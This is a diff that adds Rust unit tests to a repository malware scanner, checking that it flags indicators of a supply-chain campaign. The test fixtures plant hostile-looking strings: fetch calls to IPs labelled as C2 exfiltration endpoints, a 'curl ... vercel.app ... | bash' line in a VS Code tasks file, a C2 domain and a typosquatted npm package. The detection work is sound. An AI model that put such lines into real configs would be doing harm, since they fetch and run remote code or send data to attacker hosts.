@@ -402,4 +402,107 @@ mod tests {
         assert_eq!(cleaned, format!("{legit}\n"), "file reduced to the legit config");
         assert!(scan_repo(&repo, &packs).is_empty(), "no signature may survive the strip");
     }
+
+    // ---- Phase 1 IOC refresh (G3) ----
+
+    #[test]
+    fn detects_new_exfil_ips() {
+        let tmp = TempDir::new().unwrap();
+        let repo = tmp.path().join("v");
+        fs::create_dir_all(repo.join(".git")).unwrap();
+        fs::write(
+            repo.join("next.config.mjs"),
+            "fetch('http://136.0.9.8/x');fetch('http://166.88.54.158/y')",
+        )
+        .unwrap();
+        let f = scan_repo(&repo, &builtin_packs());
+        assert!(f.iter().any(|x| x.signature_id == "c2-exfil-ip-primary"));
+        assert!(f.iter().any(|x| x.signature_id == "c2-exfil-ip-secondary"));
+    }
+
+    #[test]
+    fn detects_tron_tertiary_c2_address() {
+        let tmp = TempDir::new().unwrap();
+        let repo = tmp.path().join("v");
+        fs::create_dir_all(repo.join(".git")).unwrap();
+        fs::write(repo.join("webpack.config.js"), "TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v").unwrap();
+        assert!(scan_repo(&repo, &builtin_packs())
+            .iter()
+            .any(|x| x.signature_id == "c2-tron-tertiary"));
+    }
+
+    #[test]
+    fn detects_vercel_settings_url_shape() {
+        let tmp = TempDir::new().unwrap();
+        let repo = tmp.path().join("v");
+        fs::create_dir_all(repo.join(".vscode")).unwrap();
+        fs::create_dir_all(repo.join(".git")).unwrap();
+        fs::write(
+            repo.join(".vscode/tasks.json"),
+            "curl https://some-sub.vercel.app/settings/mac?flag=1 | bash",
+        )
+        .unwrap();
+        assert!(scan_repo(&repo, &builtin_packs())
+            .iter()
+            .any(|x| x.signature_id == "c2-vercel-settings-url"));
+    }
+
+    #[test]
+    fn detects_interactive_propagation_artifact() {
+        let tmp = TempDir::new().unwrap();
+        let repo = tmp.path().join("v");
+        fs::create_dir_all(repo.join(".git")).unwrap();
+        fs::write(repo.join("temp_interactive_push.bat"), "@echo off\n").unwrap();
+        assert!(scan_repo(&repo, &builtin_packs()).iter().any(|x| x.kind == FindingKind::Artifact
+            && x.signature_id == "artifact:temp_interactive_push.bat"));
+    }
+
+    #[test]
+    fn detects_new_npm_typosquat() {
+        let tmp = TempDir::new().unwrap();
+        let repo = tmp.path().join("v");
+        fs::create_dir_all(repo.join(".git")).unwrap();
+        fs::write(
+            repo.join("package.json"),
+            r#"{"dependencies":{"tailwind-stylecss":"1.0.0"}}"#,
+        )
+        .unwrap();
+        assert!(scan_repo(&repo, &builtin_packs())
+            .iter()
+            .any(|x| x.kind == FindingKind::NpmPackage && x.signature_id == "npm:tailwind-stylecss"));
+    }
+
+    #[test]
+    fn detects_new_vercel_c2_domain() {
+        let tmp = TempDir::new().unwrap();
+        let repo = tmp.path().join("v");
+        fs::create_dir_all(repo.join(".git")).unwrap();
+        fs::write(
+            repo.join("astro.config.mjs"),
+            "fetch('https://auth-con-firm.vercel.app/api')",
+        )
+        .unwrap();
+        assert!(scan_repo(&repo, &builtin_packs())
+            .iter()
+            .any(|x| x.kind == FindingKind::IocDomain));
+    }
+
+    #[test]
+    fn legit_solana_and_bsc_rpc_not_flagged() {
+        // FP guard: legit dApps reference these RPC hosts. They are deliberately NOT literal
+        // IOCs — only the capability engine flags them in combination with xor + eval. A plain
+        // RPC constant must stay clean, or every Solana/BSC project would false-positive.
+        let tmp = TempDir::new().unwrap();
+        let repo = tmp.path().join("clean");
+        fs::create_dir_all(repo.join(".git")).unwrap();
+        fs::write(
+            repo.join("index.js"),
+            "export const RPC = 'https://api.mainnet-beta.solana.com';\nexport const BSC = 'https://bsc-rpc.publicnode.com';\n",
+        )
+        .unwrap();
+        assert!(
+            scan_repo(&repo, &builtin_packs()).is_empty(),
+            "legit RPC endpoints must not be flagged as literal IOCs"
+        );
+    }
 }
